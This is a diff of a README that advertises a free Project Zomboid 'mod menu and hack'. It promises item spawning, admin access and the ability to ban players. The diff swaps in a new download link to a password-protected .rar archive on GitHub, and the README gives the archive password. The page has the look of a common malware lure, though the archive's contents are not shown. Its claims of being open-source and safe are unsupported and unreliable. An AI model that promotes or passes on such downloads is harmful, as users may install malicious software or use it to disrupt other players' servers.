@@ -1,6 +1,6 @@
 # 🔥 Project Zomboid Mod Menu & Free Hack 41.78+ | Spawn Items, Admin Access, Ban Players 🔥
 
-[**Download**](https://github.com/ayhantunay/animated-spork/releases/download/pzcheat/PZ.Build.Beta.zip) [this cheat is completely free, if you see that it is being sold somewhere, there contact us below]
+[**Download**](https://github.com/ayhantunay/Project-Zomboid-Cheat/releases/download/pzcheat/PZBuildBeta.rar) [this cheat is completely free, if you see that it is being sold somewhere, there contact us below]
 # [ 🔑 ] Password for archive: Released
 
 This open-source Project Zomboid modification, coded in Java (API) and Lua (GUI), enhances gameplay with added features. Users are cautioned to use responsibly, understanding the risks involved. Compatibility is confirmed with Project Zomboid version 41.78.16 (Steam) as of July 5th, 2023. 🏆
